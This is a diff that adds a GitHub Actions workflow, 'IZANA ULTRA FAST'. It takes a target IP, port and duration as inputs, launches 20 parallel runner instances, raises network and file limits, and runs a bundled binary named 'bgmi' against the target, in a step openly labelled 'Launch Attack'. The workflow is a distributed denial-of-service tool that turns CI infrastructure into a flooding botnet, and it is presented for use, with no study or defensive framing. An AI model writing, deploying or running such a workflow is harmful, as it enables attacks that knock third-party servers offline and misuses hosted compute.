@@ -1,0 +1,56 @@
+name: ⚡ IZANA ULTRA FAST
+
+on: 
+  workflow_dispatch:
+    inputs:
+      target_ip:
+        description: '🎯 Target IP'
+        required: true
+        type: string
+      target_port: 
+        description: '🔌 Target Port'
+        required: true
+        type: string
+      attack_duration:
+        description: '⏰ Attack Duration'
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  fire:
+    runs-on: ubuntu-latest
+    
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      max-parallel: 20
+      fail-fast: false
+    
+    timeout-minutes: 3
+    
+    steps:
+      - name: ⚡ Quick Setup
+        uses: actions/checkout@v4
+        
+      - name: 🔥 System Optimization
+        run: |
+          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
+          sudo sysctl -w net.core.rmem_max=134217728
+          ulimit -n 999999
+        
+      - name: 🔥 Verify Binary
+        run: |
+          [ -f "bgmi" ] || (echo "❌ Binary missing!" && exit 1)
+          chmod +x bgmi
+          echo "✅ Binary ready - Instance ${{ matrix.instance }}"
+          
+      - name: 🚀 Launch Attack
+        run: |
+          ./bgmi "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.attack_duration }}" 3000 &
+          sleep ${{ inputs.attack_duration }}
+          
+      - name: 📊 Status
+        run: echo "✅ Instance ${{ matrix.instance }} complete"
